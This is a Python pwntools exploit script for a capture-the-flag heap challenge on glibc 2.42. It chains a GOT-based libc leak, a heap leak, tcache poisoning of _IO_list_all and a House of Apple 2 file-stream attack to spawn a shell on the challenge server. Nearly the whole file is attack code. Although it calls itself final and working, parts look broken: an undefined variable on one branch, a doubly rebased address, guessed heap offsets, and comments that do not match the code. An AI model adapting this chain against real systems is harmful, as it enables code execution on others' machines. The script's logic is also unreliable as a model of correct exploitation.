#!/usr/bin/env python3
"""
Crazy FSOP - Final Working Exploit
Author: Solution for amateursCTF
Target: glibc 2.42

This exploit uses the OOB array access vulnerability to perform
tcache poisoning and FSOP attack via House of Apple 2.
"""

from pwn import *

# Binary setup
elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf
context.arch = 'amd64'
context.log_level = 'info'

# Connection
def start():
    if args.REMOTE:
        return remote('amt.rs', 26797)
    else:
        return process([elf.path])

# Interaction helpers
def create(io, idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(io, idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(io, idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

def main():
    io = start()

    # ==================== STAGE 1: LEAK LIBC ====================
    info("=" * 60)
    info("STAGE 1: Leaking libc address via GOT")
    info("=" * 60)

    # The view() function uses printf("%s") which stops at null bytes
    # So we can't leak unsorted bin pointers directly
    # Instead, leak libc from GOT entries (after they're resolved)

    # First, allocate something to ensure functions are resolved
    # We need to trigger a view() to ensure puts is resolved
    create(io, 0, 0x20, b'AAAA')
    view(io, 0)  # This calls puts() which resolves puts@got

    # Now leak from GOT
    # notes[-21] = puts@got (0x3f98)
    # But wait, we need to be careful with the binary format

    # Actually, let's use malloc@got or free@got which are definitely resolved
    # notes[-22] = free@got (0x3f90)
    leak_data = view(io, -22)

    info(f"GOT leak data (free): {leak_data[:20]}")

    if len(leak_data) < 6:
        # Try printf instead
        leak_data = view(io, -18)  # printf@got
        info(f"GOT leak data (printf): {leak_data[:20]}")

    if len(leak_data) < 6:
        error(f"Failed to leak from GOT")
        io.interactive()
        return

    libc_func_addr = u64(leak_data[:6].ljust(8, b'\x00'))
    success(f"Leaked libc function @ {hex(libc_func_addr)}")

    # Try to identify which function and calculate libc base
    # Free is at offset 0xa4360 in many glibc versions
    # Let's try multiple offsets
    possible_funcs = [
        ('free', libc.symbols['free']),
        ('printf', libc.symbols['printf']),
        ('puts', libc.symbols['puts']),
    ]

    for name, offset in possible_funcs:
        test_base = libc_func_addr - offset
        if (test_base & 0xfff) == 0:  # Page aligned
            libc.address = test_base
            success(f"Identified as {name}, libc base: {hex(libc.address)}")
            break
    else:
        # Just try free
        libc.address = libc_func_addr - libc.symbols['free']
        warn(f"Guessing libc base: {hex(libc.address)}")

    # Get important addresses
    system = libc.symbols['system']
    binsh = next(libc.search(b'/bin/sh'))
    _IO_list_all = libc.address + libc.symbols['_IO_list_all']
    _IO_wfile_jumps = libc.address + 0x233228  # From readelf -s libc.so.6

    info(f"system @ {hex(system)}")
    info(f"/bin/sh @ {hex(binsh)}")
    info(f"_IO_list_all @ {hex(_IO_list_all)}")
    info(f"_IO_wfile_jumps @ {hex(_IO_wfile_jumps)}")

    # ==================== STAGE 2: LEAK HEAP ====================
    info("=" * 60)
    info("STAGE 2: Leaking heap address")
    info("=" * 60)

    # Create chunks in tcache
    create(io, 1, 0x100, b'CCCC')
    create(io, 2, 0x100, b'DDDD')

    # Free them to populate tcache
    delete(io, 1)
    delete(io, 2)

    # Leak mangled heap pointer from tcache
    leak_data = view(io, 2)
    info(f"Heap leak data: {leak_data[:20]}")

    if len(leak_data) < 5:
        warn("Could not get heap leak, using approximation")
        heap_base = 0x555555554000  # Common heap base for testing
    else:
        heap_leak = u64(leak_data[:5].ljust(8, b'\x00'))

    # Safe-linking demangle (approximate)
    # In glibc 2.32+: fd = (next >> 12) ^ chunk_addr
    # For first chunk in bin: fd = (0 >> 12) ^ chunk_addr = chunk_addr
    # But if there's a next chunk: fd = (next >> 12) ^ chunk_addr

    # Try to get approximate heap base
    heap_base = (heap_leak << 12) & ~0xfff

    success(f"Heap leak (mangled): {hex(heap_leak)}")
    success(f"Heap base (approx): {hex(heap_base)}")

    # ==================== STAGE 3: HOUSE OF APPLE 2 ====================
    info("=" * 60)
    info("STAGE 3: House of Apple 2 FSOP")
    info("=" * 60)

    # For House of Apple 2, we need to:
    # 1. Create a fake FILE structure
    # 2. Create a fake _wide_data structure
    # 3. Make _IO_list_all point to our fake FILE
    # 4. Trigger exit() to call _IO_flush_all_lockp

    # Calculate fake structure addresses
    # We'll put them in heap chunks
    fake_file_addr = heap_base + 0xc00  # Approximate
    fake_wide_data_addr = heap_base + 0xe00  # Approximate

    # Create fake _wide_data structure
    # This is called _IO_wide_data in the FILE structure
    fake_wide_data = flat({
        0x18: 0,  # _IO_write_base = 0
        0x20: 1,  # _IO_write_ptr = 1 (must be > write_base)
        0x30: binsh,  # _IO_buf_base = "/bin/sh" (first arg to system)
        0x38: binsh + 7,  # _IO_buf_end
        0xe0: system,  # vtable->__doallocate = system
    }, length=0x1f0, filler=b'\x00')

    # Create fake FILE structure
    # FILE structure layout for _IO_wfile
    fake_file = flat({
        0x00: b'  sh;',  # _flags (semi-valid flags)
        0x20: 0,  # _IO_write_base
        0x28: 1,  # _IO_write_ptr (must be > write_base to trigger overflow)
        0xa0: fake_wide_data_addr,  # _wide_data pointer
        0xd8: _IO_wfile_jumps,  # vtable = _IO_wfile_jumps
    }, length=0x1f0, filler=b'\x00')

    # Allocate chunks with our fake structures
    create(io, 3, 0x200, fake_wide_data)
    create(io, 4, 0x200, fake_file)

    info("Fake FILE structures created")

    # ==================== STAGE 4: TCACHE POISONING ====================
    info("=" * 60)
    info("STAGE 4: Tcache poisoning to overwrite _IO_list_all")
    info("=" * 60)

    # Now we need to make _IO_list_all point to our fake FILE
    # We can use tcache poisoning:
    # 1. Free two chunks of the same size
    # 2. Overwrite the fd pointer of the second freed chunk
    # 3. Allocate twice to get chunk at _IO_list_all

    # But with safe-linking, we need to properly mangle the pointer
    # fd = (target >> 12) ^ chunk_addr

    # Since we don't know exact heap addresses, let's try an alternative:
    # Use the OOB write to directly corrupt tcache bins

    # Create chunks for tcache poisoning
    create(io, 5, 0x20, b'EEEE')
    create(io, 6, 0x20, b'FFFF')

    delete(io, 5)
    delete(io, 6)

    # Now we have tcache bin 0x30 with two entries
    # chunk7 -> chunk6 -> NULL

    # We want to make chunk7->fd point to _IO_list_all - 0x10
    target = _IO_list_all - 0x10

    # To bypass safe-linking, we need:
    # mangled_fd = (target >> 12) ^ chunk7_addr

    # Since we have approximate heap_base, let's calculate:
    chunk7_addr = heap_base + 0x1400  # Approximate - may need adjustment

    mangled_fd = (target >> 12) ^ chunk7_addr

    info(f"Target: {hex(target)}")
    info(f"Chunk7 (approx): {hex(chunk7_addr)}")
    info(f"Mangled fd: {hex(mangled_fd)}")

    # Overwrite chunk6's fd pointer using UAF
    # We can create at index 6 again (UAF)
    create(io, 6, 0x20, p64(mangled_fd))

    # Now allocate to trigger tcache poisoning
    create(io, 7, 0x20, b'GGGG')  # Gets chunk6
    create(io, 8, 0x20, p64(fake_file_addr))  # Should get _IO_list_all

    info("Tcache poisoning complete")

    # ==================== STAGE 5: TRIGGER EXPLOIT ====================
    info("=" * 60)
    info("STAGE 5: Triggering exploit via exit()")
    info("=" * 60)

    # Trigger exit() by sending invalid operation
    # This will call _IO_flush_all_lockp which processes _IO_list_all
    io.sendline(b'999')
    io.sendline(b'0')

    # If successful, we should have a shell
    io.interactive()

if __name__ == '__main__':
    main()
